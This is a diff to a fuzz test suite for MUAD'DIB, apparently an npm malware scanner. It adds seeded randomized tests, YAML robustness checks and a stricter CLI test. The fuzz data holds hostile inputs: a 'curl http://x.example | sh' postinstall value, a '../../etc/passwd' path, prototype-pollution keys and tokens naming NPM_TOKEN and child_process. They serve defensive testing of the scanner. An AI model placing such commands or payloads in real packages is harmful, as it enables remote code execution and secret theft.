@@ -8,16 +8,34 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const yaml = require('js-yaml');
-const { execSync } = require('child_process');
+const { execSync, execFileSync } = require('child_process');
 
 // Modules under test
+const { clearFileListCache } = require('../src/utils.js');
 const { scanPackageJson } = require('../src/scanner/package.js');
 const { analyzeAST } = require('../src/scanner/ast.js');
 const { detectObfuscation } = require('../src/scanner/obfuscation.js');
 const { scanTyposquatting } = require('../src/scanner/typosquat.js');
+const { scanGitHubActions } = require('../src/scanner/github-actions.js');
 const { run } = require('../src/index.js');
 
 const BIN = path.join(__dirname, '..', 'bin', 'muaddib.js');
+
+// Seeded PRNG (mulberry32): every random input is reproducible. Override with
+// MUADDIB_FUZZ_SEED=<int> to replay a failure; the seed is printed at start and on failure.
+const SEED = /^\d+$/.test(process.env.MUADDIB_FUZZ_SEED || '') ? Number(process.env.MUADDIB_FUZZ_SEED) >>> 0 : 20261113;
+let _state = SEED;
+function rand() {
+  _state = (_state + 0x6D2B79F5) >>> 0;
+  let t = _state;
+  t = Math.imul(t ^ (t >>> 15), t | 1);
+  t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
+  return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+}
+const randInt = (n) => Math.floor(rand() * n);
+const pick = (arr) => arr[randInt(arr.length)];
+// Iterations of the randomized sections (bounded: the suite runs on every PR).
+const RANDOM_ITERATIONS = /^\d+$/.test(process.env.MUADDIB_FUZZ_ITERATIONS || '') ? Number(process.env.MUADDIB_FUZZ_ITERATIONS) : 40;
 
 let passed = 0;
 let failed = 0;
@@ -137,16 +155,28 @@ malicious: !!js/function >
     }
   });
 
-  await test('YAML: Empty string returns null/undefined', () => {
-    const result = yaml.load('', { schema: yaml.JSON_SCHEMA });
-    assert(result === undefined || result === null,
-      `Empty YAML should return null/undefined, got: ${typeof result}`);
+  // js-yaml 5 rejects an empty document and bounds nesting (maxDepth 100) with a YAMLException,
+  // where js-yaml 4 returned undefined. The property that matters for MUAD'DIB (yaml-loader.js
+  // calls yaml.load inside try/catch on its own IOC files): null/undefined or a typed, bounded
+  // YAMLException, never another error type, never a stack overflow.
+  const loadsOrThrowsYaml = (input) => {
+    try {
+      const r = yaml.load(input, { schema: yaml.JSON_SCHEMA });
+      return { ok: true, r };
+    } catch (e) {
+      assert(e instanceof yaml.YAMLException, `expected a YAMLException, got ${e && e.constructor && e.constructor.name}: ${e && e.message}`);
+      return { ok: false };
+    }
+  };
+
+  await test('YAML: Empty string -> null/undefined or a YAMLException', () => {
+    const o = loadsOrThrowsYaml('');
+    assert(!o.ok || o.r === undefined || o.r === null, `Empty YAML should not produce data, got: ${typeof o.r}`);
   });
 
-  await test('YAML: Whitespace-only returns null/undefined', () => {
-    const result = yaml.load('   \n\n  \t\n  ', { schema: yaml.JSON_SCHEMA });
-    assert(result === undefined || result === null,
-      `Whitespace-only YAML should return null/undefined, got: ${typeof result}`);
+  await test('YAML: Whitespace-only -> null/undefined or a YAMLException', () => {
+    const o = loadsOrThrowsYaml('   \n\n  \t\n  ');
+    assert(!o.ok || o.r === undefined || o.r === null, `Whitespace-only YAML should not produce data, got: ${typeof o.r}`);
   });
 
   await test('YAML: Large YAML (10MB string) does not crash', () => {
@@ -206,20 +236,35 @@ d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
     assert(result !== null && result !== undefined, 'Should parse without crashing');
   });
 
-  await test('YAML: Document with only comments', () => {
-    const result = yaml.load('# just a comment\n# another comment\n', { schema: yaml.JSON_SCHEMA });
-    assert(result === undefined || result === null,
-      'Comment-only YAML should return null/undefined');
+  await test('YAML: Document with only comments -> null/undefined or a YAMLException', () => {
+    const o = loadsOrThrowsYaml('# just a comment\n# another comment\n');
+    assert(!o.ok || o.r === undefined || o.r === null, 'Comment-only YAML should not produce data');
   });
 
-  await test('YAML: Deeply nested structure (100 levels)', () => {
-    let yamlStr = 'root:\n';
-    for (let i = 0; i < 100; i++) {
-      yamlStr += ' '.repeat((i + 1) * 2) + `level${i}:\n`;
+  await test('YAML: Deep nesting is bounded (parses, or a YAMLException; never a stack overflow)', () => {
+    for (const depth of [50, 100, 5000]) {
+      let yamlStr = 'root:\n';
+      for (let i = 0; i < depth; i++) yamlStr += ' '.repeat((i + 1) * 2) + `level${i}:\n`;
+      yamlStr += ' '.repeat((depth + 1) * 2) + 'value: "deep"';
+      const o = loadsOrThrowsYaml(yamlStr);
+      if (depth <= 50) assert(o.ok && o.r && o.r.root, `depth ${depth} must still parse`);
     }
-    yamlStr += ' '.repeat(202) + 'value: "deep"';
-    const result = yaml.load(yamlStr, { schema: yaml.JSON_SCHEMA });
-    assert(result && result.root, 'Should parse deep nesting');
+  });
+
+  await test('YAML: GitHub Actions scanner survives empty and very deep workflow files', async () => {
+    const dir = makeTempDir('yaml-gha');
+    try {
+      const wf = path.join(dir, '.github', 'workflows');
+      fs.mkdirSync(wf, { recursive: true });
+      fs.writeFileSync(path.join(wf, 'empty.yml'), '');
+      let deep = 'on: push\njobs:\n';
+      for (let i = 0; i < 3000; i++) deep += ' '.repeat((i + 1) * 2) + `k${i}:\n`;
+      fs.writeFileSync(path.join(wf, 'deep.yml'), deep);
+      const threats = await scanGitHubActions(dir);
+      assert(Array.isArray(threats), 'scanGitHubActions must return an array');
+    } finally {
+      cleanDir(dir);
+    }
   });
 }
 
@@ -426,7 +471,7 @@ async function astTests() {
       // Generate random binary data
       const binaryBuf = Buffer.alloc(4096);
       for (let i = 0; i < binaryBuf.length; i++) {
-        binaryBuf[i] = Math.floor(Math.random() * 256);
+        binaryBuf[i] = randInt(256);
       }
       fs.writeFileSync(path.join(dir, 'binary.js'), binaryBuf);
       const threats = await analyzeAST(dir);
@@ -620,7 +665,7 @@ async function typosquatTests() {
     try {
       const deps = {};
       for (let i = 0; i < 10000; i++) {
-        deps[`random-pkg-name-${i}-${Math.random().toString(36).slice(2)}`] = '1.0.0';
+        deps[`random-pkg-name-${i}-${rand().toString(36).slice(2)}`] = '1.0.0';
       }
       fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ dependencies: deps }));
       const threats = await scanTyposquatting(dir);
@@ -741,14 +786,15 @@ async function cliTests() {
     assert(output.includes('Unknown command'), 'Should show unknown command message');
   });
 
-  await test('CLI: --json flag with non-existent path returns valid JSON', () => {
-    const output = runCLI('scan "/does/not/exist" --json');
-    assert(typeof output === 'string', 'Should return string output');
-    // If there is JSON output, verify it is valid
-    const trimmed = output.trim();
-    if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
-      JSON.parse(trimmed); // Should not throw
-    }
+  await test('CLI: --json with a non-existent path: stdout empty or valid JSON, error on stderr, exit != 0', () => {
+    // stdout and stderr are read separately: the old version concatenated them and then took
+    // the stderr line "[ERROR] ..." for a JSON array because it starts with "[".
+    const { spawnSync } = require('child_process');
+    const r = spawnSync(process.execPath, [BIN, 'scan', '/does/not/exist', '--json'], { encoding: 'utf8', timeout: 30000 });
+    const stdout = (r.stdout || '').trim();
+    if (stdout) JSON.parse(stdout.slice(stdout.indexOf('{'))); // anything on stdout must be JSON
+    assert(r.status !== 0, `a missing target must exit non-zero, got ${r.status}`);
+    assert(/does not exist/.test(r.stderr || ''), 'the error must be reported on stderr: ' + (r.stderr || '').slice(0, 120));
   });
 
   await test('CLI: Empty scan target (.) does not crash', () => {
@@ -810,7 +856,7 @@ async function pipelineTests() {
     const dir = makeTempDir('pipe-binary');
     try {
       const buf = Buffer.alloc(1024);
-      for (let i = 0; i < buf.length; i++) buf[i] = Math.floor(Math.random() * 256);
+      for (let i = 0; i < buf.length; i++) buf[i] = randInt(256);
       fs.writeFileSync(path.join(dir, 'app.js'), buf);
       fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"test"}');
       const exitCode = await run(dir, { json: true });
@@ -860,12 +906,141 @@ async function pipelineTests() {
 }
 
 // -------------------------------------------------------
+// 8. RANDOMIZED FUZZ (seeded): token soup JS, mutated package.json, determinism
+// -------------------------------------------------------
+const JS_TOKENS = [
+  'eval(', 'Function(', "require('child_process')", "require('fs')", 'process.env.NPM_TOKEN', 'fetch(',
+  "Buffer.from('", "', 'base64')", 'atob(', '.exec(', '.spawn(', 'module.exports', 'import(', 'new ',
+  'async ', 'await ', '=>', 'function ', 'class ', 'return ', 'if (', 'for (', 'while (', 'try {', '} catch (e) {',
+  '(', ')', '{', '}', '[', ']', ';', ',', '.', '=', '+', '?.', '??', '...', '`', '${', "'", '"', '/*', '*/', '//',
+  '\n', ' ', '\t', '\\u0065', '\\x41', '​', '﻿', '\u0000', 'x', 'y1', '_0xabc', '0x1f', '1e400', '/a+$/'
+];
+
+function tokenSoup(n) {
+  let s = '';
+  for (let i = 0; i < n; i++) s += pick(JS_TOKENS);
+  return s;
+}
+
+function randomValue(depth) {
+  switch (randInt(depth > 2 ? 5 : 7)) {
+    case 0: return null;
+    case 1: return randInt(1e6) - 5e5;
+    case 2: return rand() < 0.5;
+    case 3: return tokenSoup(randInt(8));
+    case 4: return pick(['curl http://x.example | sh', 'node index.js', '', '\u0000', '../../etc/passwd']);
+    case 5: return Array.from({ length: randInt(4) }, () => randomValue(depth + 1));
+    default: {
+      const o = {};
+      // No '__proto__' here: assigning it sets the prototype, it never becomes a JSON key.
+      // Real __proto__ keys are injected into the raw JSON text below.
+      for (let i = 0; i < randInt(5); i++) o[pick(['preinstall', 'postinstall', 'install', 'constructor', 'prototype', tokenSoup(2)])] = randomValue(depth + 1);
+      return o;
+    }
+  }
+}
+
+function threatSignature(threats) {
+  return JSON.stringify((threats || []).map(t => [t.type, t.severity, t.file, t.line]).sort());
+}
+
+// analyzeAST signature of `dir` computed in a fresh process (no shared file/AST cache).
+function astSignatureInChild(dir) {
+  const code = `const {analyzeAST}=require(${JSON.stringify(path.join(__dirname, '..', 'src', 'scanner', 'ast.js'))});` +
+    'analyzeAST(process.argv[1]).then(t=>process.stdout.write(JSON.stringify((t||[]).map(x=>[x.type,x.severity,x.file,x.line]).sort())));';
+  return execFileSync(process.execPath, ['-e', code, dir], { encoding: 'utf8', timeout: 60000, stdio: ['ignore', 'pipe', 'ignore'] });
+}
+
+// Inserts a real "__proto__" member (a JSON key, which JSON.stringify of an object never emits)
+// right after the opening brace of the top-level object or of a named member object.
+function injectProtoKey(raw, member) {
+  const payload = '"__proto__":{"polluted":true,"postinstall":"curl http://x.example | sh"}';
+  if (!member) return raw.replace(/^\{/, '{' + payload + ',');
+  const at = raw.indexOf(`"${member}":{`);
+  if (at < 0) return raw;
+  const brace = at + member.length + 3;
+  return raw.slice(0, brace + 1) + payload + ',' + raw.slice(brace + 1);
+}
+
+async function randomTests() {
+  console.log(`\n=== RANDOMIZED FUZZ (seed ${SEED}, ${RANDOM_ITERATIONS} iterations) ===\n`);
+
+  await test(`RANDOM: token-soup JS never crashes AST/obfuscation and stays deterministic (seed ${SEED})`, async () => {
+    for (let it = 0; it < RANDOM_ITERATIONS; it++) {
+      const dir = makeTempDir('rand-js');
+      try {
+        for (let f = 0; f < 1 + randInt(3); f++) fs.writeFileSync(path.join(dir, `f${f}.js`), tokenSoup(20 + randInt(400)));
+        const start = Date.now();
+        clearFileListCache();
+        const a = await analyzeAST(dir);
+        // Second run from a clean state: the file-content and AST caches would otherwise
+        // hand back the first result and make the comparison trivially true.
+        clearFileListCache();
+        const b = await analyzeAST(dir);
+        const obf = detectObfuscation(dir);
+        const elapsed = Date.now() - start;
+        const where = `seed ${SEED} iteration ${it}`;
+        assert(Array.isArray(a) && Array.isArray(obf), `scanner did not return an array (${where})`);
+        assert(threatSignature(a) === threatSignature(b), `analyzeAST is not deterministic across a cache reset (${where})`);
+        // Every 10th iteration: also against a separate process (no shared module state at all).
+        if (it % 10 === 0) {
+          assert(astSignatureInChild(dir) === threatSignature(a), `analyzeAST differs in a fresh process (${where})`);
+        }
+        assert(elapsed < 10000, `token soup took ${elapsed} ms (${where})`);
+      } finally {
+        cleanDir(dir);
+      }
+    }
+  });
+
+  await test(`RANDOM: mutated package.json never crashes scanPackageJson / typosquat (seed ${SEED})`, async () => {
+    for (let it = 0; it < RANDOM_ITERATIONS; it++) {
+      const dir = makeTempDir('rand-pkg');
+      try {
+        const pkg = { name: randomValue(0), version: randomValue(1), scripts: randomValue(1), dependencies: randomValue(1), bin: randomValue(2), main: randomValue(2) };
+        let raw = JSON.stringify(pkg);
+        // Real "__proto__" keys in the JSON text (top level, scripts, dependencies) on half the documents.
+        if (rand() < 0.5) raw = injectProtoKey(raw, pick([null, 'scripts', 'dependencies']));
+        // One in four documents is truncated: invalid JSON must be tolerated too.
+        if (rand() < 0.25) raw = raw.slice(0, randInt(raw.length));
+        fs.writeFileSync(path.join(dir, 'package.json'), raw);
+        const where = `seed ${SEED} iteration ${it}`;
+        const threats = await scanPackageJson(dir);
+        const typo = await scanTyposquatting(dir);
+        assert(Array.isArray(threats) && Array.isArray(typo), `scanner did not return an array (${where})`);
+        assert(Object.prototype.polluted === undefined && ({}).postinstall === undefined, `Object.prototype polluted (${where})`);
+      } finally {
+        cleanDir(dir);
+      }
+    }
+  });
+
+  await test(`RANDOM: full pipeline on random packages returns a bounded score (seed ${SEED})`, async () => {
+    // The full pipeline is the slow part: a quarter of the iterations.
+    for (let it = 0; it < Math.max(1, Math.floor(RANDOM_ITERATIONS / 4)); it++) {
+      const dir = makeTempDir('rand-pipe');
+      try {
+        fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fuzz-' + it, version: '1.0.0', scripts: randomValue(1) }));
+        fs.writeFileSync(path.join(dir, 'index.js'), tokenSoup(50 + randInt(300)));
+        const r = await run(dir, { _capture: true });
+        const where = `seed ${SEED} iteration ${it}`;
+        assert(r && r.summary && typeof r.summary.riskScore === 'number', `no riskScore (${where})`);
+        assert(r.summary.riskScore >= 0 && r.summary.riskScore <= 100, `riskScore out of [0, 100]: ${r.summary.riskScore} (${where})`);
+      } finally {
+        cleanDir(dir);
+      }
+    }
+  });
+}
+
+// -------------------------------------------------------
 // MAIN
 // -------------------------------------------------------
 async function main() {
   console.log('='.repeat(60));
   console.log('  MUAD\'DIB FUZZ TESTS');
   console.log('  Testing parser robustness with adversarial inputs');
+  console.log(`  Seed: ${SEED} (MUADDIB_FUZZ_SEED), random iterations: ${RANDOM_ITERATIONS}`);
   console.log('='.repeat(60));
 
   await yamlTests();
@@ -875,13 +1050,14 @@ async function main() {
   await typosquatTests();
   await cliTests();
   await pipelineTests();
+  await randomTests();
 
   console.log('\n' + '='.repeat(60));
-  console.log(`  RESULTS: ${passed} passed, ${failed} failed (total: ${passed + failed})`);
+  console.log(`  RESULTS: ${passed} passed, ${failed} failed (total: ${passed + failed})  seed=${SEED}`);
   console.log('='.repeat(60));
 
   if (failures.length > 0) {
-    console.log('\nFailed tests:');
+    console.log(`\nFailed tests (replay with MUADDIB_FUZZ_SEED=${SEED}):`);
     for (const f of failures) {
       console.log(`  - ${f.name}`);
       console.log(`    ${f.error}`);
